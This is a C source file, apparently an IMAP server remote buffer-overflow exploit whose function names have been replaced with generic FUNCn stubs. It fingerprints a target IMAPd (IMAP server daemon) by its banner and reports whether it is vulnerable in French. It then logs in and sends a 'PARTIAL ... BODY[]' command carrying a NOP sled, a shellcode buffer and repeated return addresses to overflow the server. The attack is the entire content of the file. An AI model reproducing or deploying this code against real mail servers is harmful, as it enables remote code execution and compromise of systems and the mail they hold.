#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
struct servent {int /*<<< orphan*/  s_port; } ;
struct hostent {int /*<<< orphan*/  h_addrtype; int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  imap_info ;
typedef  int /*<<< orphan*/  buffer ;

/* Variables and functions */
 int /*<<< orphan*/  DEFAULT_PROTOCOL ; 
 int ERROR_EXIT ; 
 int GOOD_EXIT ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 scalar_t__ FUNC4 (int,struct sockaddr*,int) ; 
 struct hostent* FUNC5 (char*) ; 
 struct servent* FUNC6 (char*,char*) ; 
 int FUNC7 (int,char*,int) ; 
 int FUNC8 (int,char*) ; 
 int FUNC9 (int) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC12 (char*,...) ; 
 int /*<<< orphan*/  sc ; 
 int /*<<< orphan*/  FUNC13 (int,int) ; 
 int FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,char*,...) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * FUNC17 (char*,char*) ; 
 int FUNC18 (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC19 (char*) ; 

int FUNC20(int argc, char *argv[])
{
  struct sockaddr_in server;
  struct servent *sp;
  struct hostent *hp;
  int s, i , ret, align;
  int blaw = 1024;
  char *user, *passwd;

  char imap_info[4096];
  char imap_login[4096];
  char imap_query[4096];
  char buffer[2048];

  int exit_code = GOOD_EXIT;

  if (argc != 6) FUNC19(argv[0]);

  user = argv[2];
  passwd = argv[3];
  ret = FUNC18(argv[4], NULL, 16);
  align = FUNC0(argv[5]);

  if ((hp = FUNC5(argv[1])) == NULL)
    exit_code = ERROR_EXIT;

  if ((exit_code == GOOD_EXIT) && (sp = FUNC6("imap2", "tcp")) ==
NULL)
    exit_code = ERROR_EXIT;

  if (exit_code == GOOD_EXIT) {
    if ((s = FUNC14(PF_INET, SOCK_STREAM, DEFAULT_PROTOCOL)) < 0)
      return exit_code = ERROR_EXIT;

    FUNC2((char *) &server, sizeof(server));
    FUNC1(hp->h_addr, (char *) &server.sin_addr, hp->h_length);
    server.sin_family = hp->h_addrtype;
    server.sin_port = sp->s_port;
    if (FUNC4(s, (struct sockaddr *) &server, sizeof(server)) < 0)
      exit_code = ERROR_EXIT;
    else {
      FUNC12(" [1;34mV�rification de la banni�re : [0m\n");
      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info)) ==
ERROR_EXIT)) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      FUNC12("%s", imap_info);
      if (FUNC17(imap_info, "IMAP4rev1 200") == NULL) {
        FUNC12(" [1;32mService IMAPd non reconnu ... [0m\n");
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC8(s, "x CAPABILITY\n")) == ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      FUNC12(" [1;34mV�rification des options du service : [0m\n");
      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      FUNC12("%s", imap_info);
      if (FUNC17(imap_info, " IMAP4 ") == NULL) {
        FUNC12(" [1;32mService IMAPd non vuln�rable ... [0m\n");
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      FUNC12(" [1;31mService IMAPd vuln�rable ... [0m\n");
      FUNC15(imap_login, "x LOGIN %s %s\n", user, passwd);
      if ((exit_code = FUNC8(s, imap_login)) == ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }
      FUNC12("%s", imap_info);

      if ((exit_code = FUNC8(s, "x SELECT Inbox\n")) == ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }
      FUNC12("%s", imap_info);

      FUNC11(buffer, 0x90, sizeof(buffer));
      FUNC10(buffer + 512, sc, FUNC16(sc));

      for (i = blaw + align ; i < 1096; i +=4)
        *(unsigned int *)(&buffer[i]) = ret;

      *(unsigned int *)(&buffer[i + 1]) = 0;

      FUNC15(imap_query, "x PARTIAL 1 BODY[%s] 1 1\n", buffer);
      if ((exit_code = FUNC8(s, imap_query)) == ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC8(s, "x LOGOUT\n")) == ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }

      if ((exit_code = FUNC7(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        FUNC13(s, 2);
        FUNC3(s);
        return exit_code;
      }
    }
  }

      i = FUNC9( s );

  return exit_code;
}